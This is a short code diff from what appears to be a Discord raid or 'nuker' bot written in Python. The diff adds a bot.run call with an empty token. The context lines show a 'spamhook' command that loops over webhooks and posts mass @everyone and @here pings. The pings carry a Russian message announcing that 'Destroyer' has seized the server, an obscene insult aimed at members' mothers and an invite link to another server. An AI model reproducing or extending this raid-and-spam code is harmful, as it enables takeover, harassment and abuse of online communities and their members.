@@ -188,3 +188,5 @@ async def spamhook(ctx):
           await f.send(content='@everyone @here Привет лохи, это я, ваш палач Destroyer, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://discord.gg/хуй', wait=True)
       except:
         continue
+	
+bot.run("")
